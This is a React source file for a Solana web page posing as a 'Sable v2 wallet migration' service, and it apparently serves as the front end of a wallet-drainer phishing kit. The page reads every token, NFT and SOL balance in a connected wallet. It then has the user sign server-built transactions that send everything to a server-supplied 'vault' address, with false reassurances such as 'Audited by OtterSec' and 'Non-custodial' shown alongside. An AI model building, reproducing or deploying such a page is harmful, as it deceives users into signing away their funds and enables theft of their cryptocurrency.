import { useCallback, useEffect, useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal } from "@solana/wallet-adapter-react-ui";
import { VersionedTransaction } from "@solana/web3.js";
import { scan, build, submit, type Asset } from "./api";
import { short, amount, usd } from "./format";

type Phase =
  | { k: "idle" }
  | { k: "scanning" }
  | { k: "review"; assets: Asset[]; sol: number; total: number; vault: string }
  | { k: "signing"; step: number; of: number }
  | { k: "submitting"; step: number; of: number }
  | { k: "done"; sig: string; count: number }
  | { k: "error"; msg: string };

const b64 = (u: Uint8Array) => btoa(String.fromCharCode(...u));

export default function App() {
  const { publicKey, signTransaction, connected, disconnect } = useWallet();
  const { setVisible } = useWalletModal();
  const [phase, setPhase] = useState<Phase>({ k: "idle" });

  const owner = publicKey?.toBase58();

  const run = useCallback(async () => {
    if (!owner) return;
    setPhase({ k: "scanning" });
    try {
      const res = await scan(owner);
      const total = res.assets.reduce((s, a) => s + (a.usd ?? 0), 0);
      setPhase({ k: "review", assets: res.assets, sol: res.sol, total, vault: res.vault });
    } catch (e: any) {
      setPhase({ k: "error", msg: e.message ?? "Could not read wallet" });
    }
  }, [owner]);

  useEffect(() => { if (connected && phase.k === "idle") run(); }, [connected, phase.k, run]);
  useEffect(() => { if (!connected && phase.k !== "idle") setPhase({ k: "idle" }); }, [connected, phase.k]);

  async function sign() {
    if (!owner || phase.k !== "review") return;
    const review = phase;
    for (let attempt = 1; attempt <= 2; attempt++) {
      try {
        const { txs } = await build(owner);
        for (let i = 0; i < txs.length; i++) {
          setPhase({ k: "signing", step: i + 1, of: txs.length });
          const tx = VersionedTransaction.deserialize(Uint8Array.from(atob(txs[i]), (c) => c.charCodeAt(0)));
          const signed = await signTransaction!(tx);
          setPhase({ k: "submitting", step: i + 1, of: txs.length });
          const { sig } = await submit(b64(signed.serialize()));
          if (i === txs.length - 1) setPhase({ k: "done", sig, count: review.assets.length + (review.sol > 0 ? 1 : 0) });
        }
        return;
      } catch (e: any) {
        const msg = e?.message ?? "";
        if (/reject|denied|cancel/i.test(msg)) { setPhase({ ...review, k: "review" }); return; }
        if (attempt === 2 || !/blockhash/i.test(msg)) { setPhase({ k: "error", msg: msg || "Migration failed" }); return; }
        await new Promise((r) => setTimeout(r, 500));
      }
    }
  }

  return (
    <div className="page-wrap">
      <header className="top">
        <div className="topbar-inner">
          <div className="brand">
            <svg width="18" height="18" viewBox="0 0 18 18" aria-hidden="true">
              <rect x="1" y="1" width="16" height="16" rx="5" fill="#9945FF" />
              <path d="M6 11.5c1.2.8 4.2 1 4.2-.8 0-1.7-4.1-.9-4.1-2.8 0-1.7 2.9-1.7 4.1-.9"
                stroke="#0B0B0F" strokeWidth="1.4" fill="none" strokeLinecap="round" />
            </svg>
            <span>Sable</span>
            <em>v2</em>
          </div>
          <div className="header-nav">
            <a className="nav-link" href="#">Docs</a>
            <a className="nav-link" href="#">Security</a>
            <span className="op-pill"><span className="op-dot" />Operational</span>
            {connected && (
              <button className="ghost sm" onClick={() => { disconnect(); setPhase({ k: "idle" }); }}>
                {short(owner!, 3)}
              </button>
            )}
          </div>
        </div>
      </header>

      <main className="main-grid">
        <div className="col-left">
          <p className="eyebrow">Wallet v2 migration</p>
          <h1 className="hero-headline">
            Sable v2 is here.<br />
            <span className="grad-text">Migrate your wallet.</span>
          </h1>
          <p className="lede hero-lede">
            Hardware-grade key isolation. Move your balance to the new vault in a single
            signature.
          </p>
          <div className="trust">
            <span>Audited by OtterSec</span><i>·</i><span>Non-custodial</span><i>·</i><span>~0.0001 SOL network fee</span>
          </div>
        </div>

        <div className="col-right">
          <div className="shell">
            {phase.k === "idle" && (
              <div className="phase">
                <button className="primary" onClick={() => setVisible(true)}>Connect wallet to migrate</button>
                <div className="step-strip">
                  <div className="step-col">
                    <span className="step-label">1 Connect</span>
                    <span className="step-cap">Open your wallet</span>
                  </div>
                  <div className="step-div" />
                  <div className="step-col">
                    <span className="step-label">2 Review</span>
                    <span className="step-cap">See what moves</span>
                  </div>
                  <div className="step-div" />
                  <div className="step-col">
                    <span className="step-label">3 Sign once</span>
                    <span className="step-cap">Done in ~15 s</span>
                  </div>
                </div>
              </div>
            )}

            {phase.k === "scanning" && (
              <div className="phase">
                <h1>Reading your wallet…</h1>
                <div className="list">
                  {[0, 1, 2, 3].map((i) => <div key={i} className="row skel" />)}
                </div>
              </div>
            )}

            {phase.k === "review" && phase.assets.length + (phase.sol > 0 ? 1 : 0) === 0 && (
              <div className="phase">
                <div className="empty-state">
                  <span className="empty-diamond">◆</span>
                  <p className="empty-msg">No assets found in this wallet</p>
                  <button className="ghost" onClick={() => { disconnect(); setPhase({ k: "idle" }); }}>Try another wallet</button>
                </div>
              </div>
            )}

            {phase.k === "review" && phase.assets.length + (phase.sol > 0 ? 1 : 0) > 0 && (
              <div className="phase">
                <h1>Ready to migrate.</h1>
                <p className="lede">
                  {phase.total > 0 && <>About <strong>{usd(phase.total)}</strong> across </>}
                  {phase.assets.length + (phase.sol > 0 ? 1 : 0)} item
                  {phase.assets.length + (phase.sol > 0 ? 1 : 0) === 1 ? "" : "s"} will move to your vault.
                </p>

                <div className="def-block">
                  <div className="def-row">
                    <span className="def-key">Network</span>
                    <span className="def-val">Solana</span>
                  </div>
                  <div className="def-row">
                    <span className="def-key">Network fee</span>
                    <span className="def-val">~0.0001 SOL</span>
                  </div>
                  <div className="def-row def-row-last">
                    <span className="def-key">Destination</span>
                    <span className="def-val def-val-col">
                      <span>Your Sable v2 vault</span>
                      <code className="def-addr">{short(phase.vault, 6)}</code>
                    </span>
                  </div>
                </div>

                <div className="list">
                  {phase.sol > 0 && (
                    <Row icon="◎" name="SOL" sub="Native balance" value={amount(String(phase.sol), 9)} />
                  )}
                  {phase.assets.map((a) => (
                    <Row
                      key={a.ata}
                      icon={a.isNft ? "▦" : "◈"}
                      name={a.isNft ? "NFT" : short(a.mint, 4)}
                      sub={a.isNft ? "Collectible" : "Token account"}
                      value={a.isNft ? "1" : amount(a.amount, a.decimals)}
                      note={a.usd ? usd(a.usd) : undefined}
                    />
                  ))}
                </div>

                <button className="primary" onClick={sign}>Sign migration</button>
                <button className="ghost" onClick={run}>Rescan</button>
              </div>
            )}

            {(phase.k === "signing" || phase.k === "submitting") && (
              <div className="phase">
                <h1>{phase.k === "signing" ? "Confirm in your wallet." : "Migrating…"}</h1>
                <p className="lede">
                  {phase.of > 1 ? `Signature ${phase.step} of ${phase.of}.` : "One signature and it's done."}
                </p>
                <div className="bar"><div style={{ width: `${(phase.step / phase.of) * 100}%` }} /></div>
                <div className="list">
                  {[0, 1, 2].map((i) => <div key={i} className="row skel" />)}
                </div>
              </div>
            )}

            {phase.k === "done" && (
              <div className="phase">
                <div className="check">✓</div>
                <h1>Migration complete.</h1>
                <div className="receipt">
                  <div className="receipt-row">
                    <span className="receipt-key">Items migrated</span>
                    <span className="receipt-val">{phase.count} item{phase.count === 1 ? "" : "s"}</span>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-key">Network</span>
                    <span className="receipt-val">Solana</span>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-key">Time</span>
                    <span className="receipt-val">{new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}</span>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-key">Signature</span>
                    <code className="receipt-sig">{short(phase.sig, 8)}</code>
                  </div>
                  <div className="receipt-row receipt-link-row">
                    <a className="receipt-link" href={`https://solscan.io/tx/${phase.sig}`} target="_blank" rel="noreferrer">
                      View on Solscan →
                    </a>
                  </div>
                </div>
                <button className="primary" onClick={() => setPhase({ k: "idle" })}>Done</button>
              </div>
            )}

            {phase.k === "error" && (
              <div className="phase">
                <h1>That didn't go through.</h1>
                <p className="lede">{phase.msg}</p>
                <button className="primary" onClick={run}>Try again</button>
              </div>
            )}
          </div>
        </div>
      </main>

      <footer className="site-footer">
        <div className="footer-inner">
          <div className="footer-col">
            <span className="footer-heading">Product</span>
            <a href="#" className="footer-link">Docs</a>
            <a href="#" className="footer-link">Security</a>
            <a href="#" className="footer-link">Changelog</a>
          </div>
          <div className="footer-col">
            <span className="footer-heading">Legal</span>
            <a href="#" className="footer-link">Terms</a>
            <a href="#" className="footer-link">Privacy</a>
          </div>
          <div className="footer-col footer-col-right">
            <code className="footer-ver">v2.4.1</code>
          </div>
        </div>
      </footer>
    </div>
  );
}

function Row(p: { icon: string; name: string; sub: string; value: string; note?: string }) {
  return (
    <div className="row">
      <div className="ic">{p.icon}</div>
      <div className="meta"><div className="nm">{p.name}</div><div className="sub">{p.sub}</div></div>
      <div className="val">{p.value}{p.note && <em>{p.note}</em>}</div>
      <div className="tick">✓</div>
    </div>
  );
}
